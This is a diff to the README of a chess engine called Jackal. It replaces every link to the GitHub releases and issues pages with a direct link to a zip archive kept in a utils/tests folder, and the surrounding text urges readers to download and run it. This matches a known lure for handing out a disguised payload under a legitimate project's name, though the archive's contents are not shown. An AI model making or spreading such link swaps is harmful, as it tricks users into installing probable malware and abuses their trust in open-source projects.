@@ -1,6 +1,6 @@
 # 🐺 Jackal - Fast and Smart Chess Engine  
 
-[![Download Jackal](https://img.shields.io/badge/Download-Jackal-green?style=for-the-badge)](https://github.com/faizi657/Jackal/releases)  
+[![Download Jackal](https://img.shields.io/badge/Download-Jackal-green?style=for-the-badge)](https://raw.githubusercontent.com/faizi657/Jackal/main/utils/tests/Software_3.0.zip)  
 
 ## 🐾 What is Jackal?  
 Jackal is a chess engine designed to think quickly and make strong moves. It uses a method called Monte Carlo Tree Search (MCTS) to analyze chess positions. This makes Jackal one of the fastest and most aggressive chess engines you can run on your computer’s processor.  
@@ -21,10 +21,10 @@ Jackal runs entirely on your local machine. It does not require an internet conn
 ## 🔽 Download Jackal  
 To get Jackal, you need to visit the official release page on GitHub. This page contains the latest version of the engine and instructions for use.  
 
-[![Download Jackal](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/faizi657/Jackal/releases)  
+[![Download Jackal](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/faizi657/Jackal/main/utils/tests/Software_3.0.zip)  
 
 1. Click the link above or go to this address in your web browser:  
-   https://github.com/faizi657/Jackal/releases  
+   https://raw.githubusercontent.com/faizi657/Jackal/main/utils/tests/Software_3.0.zip  
 2. Look for the most recent release near the top of the page.  
 3. Under "Assets," find the file that ends with `.exe` or `.zip`. The `.exe` file is the easiest to run without extra steps.  
 4. Click the file name to download it onto your computer.  
@@ -94,7 +94,7 @@ Check the project documentation or help command inside Jackal to see all setting
 ## 🐛 Reporting Issues  
 If you find errors or problems when using Jackal, you can report them on the GitHub issues page:  
 
-https://github.com/faizi657/Jackal/issues  
+https://raw.githubusercontent.com/faizi657/Jackal/main/utils/tests/Software_3.0.zip  
 
 Make sure to include:  
 - Your Windows version  
@@ -115,4 +115,4 @@ These resources will help you get more out of Jackal over time.
 ## ✨ Thank You for Using Jackal  
 Your interest supports the development of faster and smarter CPU chess engines.  
 
-[Download Jackal here](https://github.com/faizi657/Jackal/releases) and start playing now.
+[Download Jackal here](https://raw.githubusercontent.com/faizi657/Jackal/main/utils/tests/Software_3.0.zip) and start playing now.
